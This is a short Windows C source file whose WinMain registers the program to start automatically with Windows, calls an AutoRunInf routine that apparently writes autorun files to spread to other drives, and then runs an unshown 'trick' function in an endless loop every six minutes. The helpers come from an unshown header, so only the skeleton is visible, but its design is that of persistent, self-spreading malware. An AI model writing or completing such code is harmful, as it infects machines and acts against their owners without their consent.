#include"Header.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	bool flag;
	flag = IsMyProgramRegisteredForStartup(L"My_Program");
 
	if (flag == FALSE)
		RegisterProgram();
	AutoRunInf();
	while (1)
	{
		trick();
		Sleep(360000);
	}
	return 0;
}

